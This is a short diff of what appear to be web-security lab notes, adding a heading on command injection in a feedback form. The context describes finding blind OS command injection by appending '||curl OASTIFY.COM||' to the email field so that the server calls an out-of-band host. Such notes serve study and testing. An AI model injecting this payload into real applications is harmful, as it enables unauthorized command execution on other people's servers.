@@ -4597,6 +4597,8 @@ echo $cookie;
  \n
 ```  
 
+Command Injection ==> Submit Feedback functionality `/feedback/submit`
+
 >The target application **submit feedback** function require email value, and ***identifying*** blind OS command injection by appending ```||curl OASTIFY.COM||``` bash command, we then can observe a request made to Collaborator.  
   
 ```bash
